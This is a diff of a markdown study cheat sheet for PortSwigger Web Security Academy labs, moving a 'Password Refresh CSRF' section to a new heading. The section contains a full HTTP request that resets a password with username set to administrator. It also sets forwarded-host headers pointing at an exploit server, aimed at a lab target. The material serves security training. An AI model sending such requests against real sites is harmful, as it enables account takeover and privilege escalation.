@@ -429,7 +429,38 @@ Connection: close
 
 [PortSwigger Lab: User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)  
 
+### Password Refresh CSRF  
+  
+>Refresh password POST request,then change username parameter to administrator while logged in as low priv user, CSRF where token is not tied to user session.  
 
+```html
+POST /refreshpassword HTTP/1.1
+Host: TARGET.web-security-academy.net
+Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MCwCFAI9forAezNBAK%2fWxko91dgAiQd1AhQMZgWruKy%2fs0DZ0XW0wkyATeU7aA%3d%3d
+Content-Length: 60
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+Origin: https://TARGET.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+X-Forwarded-Host: exploit.exploit-server.net
+X-Host: exploit.exploit-server.net
+X-Forwarded-Server: exploit.exploit-server.net
+Referer: https://TARGET.web-security-academy.net/refreshpassword
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+csrf=TOKEN&username=administrator
+```  
+
+![CSRF privesc](csrf-privesc.png)  
+
+[PortSwigger Lab: Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)  
 
 ### Brute Force Authentication  
 
@@ -1036,36 +1067,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 ## CSRF  
 
 >Cross-Site Request Forgery vulnerability allows an attacker to force users to perform actions that they do not intend to perform.  
-
->Refresh password POST request,then change username parameter to administrator while logged in as low priv user, CSRF where token is not tied to user session
-
-```html
-POST /refreshpassword HTTP/1.1
-Host: TARGET.web-security-academy.net
-Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MCwCFAI9forAezNBAK%2fWxko91dgAiQd1AhQMZgWruKy%2fs0DZ0XW0wkyATeU7aA%3d%3d
-Content-Length: 60
-Cache-Control: max-age=0
-Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
-Sec-Ch-Ua-Mobile: ?0
-Sec-Ch-Ua-Platform: "Linux"
-Upgrade-Insecure-Requests: 1
-Origin: https://TARGET.web-security-academy.net
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-X-Forwarded-Host: exploit.exploit-server.net
-X-Host: exploit.exploit-server.net
-X-Forwarded-Server: exploit.exploit-server.net
-Referer: https://TARGET.web-security-academy.net/refreshpassword
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Connection: close
-
-csrf=TOKEN&username=administrator
-```  
-
-![CSRF privesc](csrf-privesc.png)  
-
+  
 >oAuth linking exploit server hosting iframe, then deliver to victim, forcing user to update code linked.  
 
 ![csrf](csrf.png)  
